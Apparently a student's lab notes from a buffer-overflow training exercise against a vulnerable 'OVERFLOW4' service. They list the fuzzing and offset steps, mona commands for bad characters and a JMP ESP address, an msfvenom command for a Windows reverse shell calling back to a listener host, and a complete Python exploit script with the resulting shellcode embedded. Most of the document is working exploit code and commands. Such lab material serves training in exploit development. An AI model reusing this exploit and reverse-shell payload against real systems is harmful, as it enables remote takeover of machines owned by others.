con## fuzzing

![[Pasted image 20210530131417.png]]

## offset 
EIP: 70433570

![[Pasted image 20210530140957.png]]


offset: 2026
![[Pasted image 20210530141035.png]]

![[Pasted image 20210530141142.png]]

## bad chars

`!mona config -set workingfolder c:\mona\%p`

`!mona bytearray -b "\x00"`

ESP: 018BFA30

![[Pasted image 20210530141859.png]]


`!mona compare -f C:\mona\oscp\bytearray.bin -a 018BFA30`

bad chars: `\x00\xa9\xcd\xd4`

![[Pasted image 20210530142030.png]]


## jmp point

`!mona jmp -r esp -cpb "\x00\xa9\xcd\xd4"`

`625011AF`

little endian:
`\xaf\x11\x50\x62`

![[Pasted image 20210530142259.png]]

## exploit 

`msfvenom -p windows/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\xa9\xcd\xd4"`

![[Pasted image 20210530142545.png]]

```python
import socket

ip = "10.10.171.241"
port = 1337

prefix = "OVERFLOW4 "
offset = 2026
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = (
"\xda\xdc\xd9\x74\x24\xf4\x5f\xb8\xfe\x81\xd3\xfa\x33\xc9\xb1"
"\x52\x83\xef\xfc\x31\x47\x13\x03\xb9\x92\x31\x0f\xb9\x7d\x37"
"\xf0\x41\x7e\x58\x78\xa4\x4f\x58\x1e\xad\xe0\x68\x54\xe3\x0c"
"\x02\x38\x17\x86\x66\x95\x18\x2f\xcc\xc3\x17\xb0\x7d\x37\x36"
"\x32\x7c\x64\x98\x0b\x4f\x79\xd9\x4c\xb2\x70\x8b\x05\xb8\x27"
"\x3b\x21\xf4\xfb\xb0\x79\x18\x7c\x25\xc9\x1b\xad\xf8\x41\x42"
"\x6d\xfb\x86\xfe\x24\xe3\xcb\x3b\xfe\x98\x38\xb7\x01\x48\x71"
"\x38\xad\xb5\xbd\xcb\xaf\xf2\x7a\x34\xda\x0a\x79\xc9\xdd\xc9"
"\x03\x15\x6b\xc9\xa4\xde\xcb\x35\x54\x32\x8d\xbe\x5a\xff\xd9"
"\x98\x7e\xfe\x0e\x93\x7b\x8b\xb0\x73\x0a\xcf\x96\x57\x56\x8b"
"\xb7\xce\x32\x7a\xc7\x10\x9d\x23\x6d\x5b\x30\x37\x1c\x06\x5d"
"\xf4\x2d\xb8\x9d\x92\x26\xcb\xaf\x3d\x9d\x43\x9c\xb6\x3b\x94"
"\xe3\xec\xfc\x0a\x1a\x0f\xfd\x03\xd9\x5b\xad\x3b\xc8\xe3\x26"
"\xbb\xf5\x31\xe8\xeb\x59\xea\x49\x5b\x1a\x5a\x22\xb1\x95\x85"
"\x52\xba\x7f\xae\xf9\x41\xe8\xdb\xec\x4d\x38\xb3\x0c\x4d\x9b"
"\x6d\x98\xab\xb1\x7d\xcc\x64\x2e\xe7\x55\xfe\xcf\xe8\x43\x7b"
"\xcf\x63\x60\x7c\x9e\x83\x0d\x6e\x77\x64\x58\xcc\xde\x7b\x76"
"\x78\xbc\xee\x1d\x78\xcb\x12\x8a\x2f\x9c\xe5\xc3\xa5\x30\x5f"
"\x7a\xdb\xc8\x39\x45\x5f\x17\xfa\x48\x5e\xda\x46\x6f\x70\x22"
"\x46\x2b\x24\xfa\x11\xe5\x92\xbc\xcb\x47\x4c\x17\xa7\x01\x18"
"\xee\x8b\x91\x5e\xef\xc1\x67\xbe\x5e\xbc\x31\xc1\x6f\x28\xb6"
"\xba\x8d\xc8\x39\x11\x16\xe8\xdb\xb3\x63\x81\x45\x56\xce\xcc"
"\x75\x8d\x0d\xe9\xf5\x27\xee\x0e\xe5\x42\xeb\x4b\xa1\xbf\x81"
"\xc4\x44\xbf\x36\xe4\x4c"
)

postfix = ""

buffer = prefix + overflow + retn + padding + payload  + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```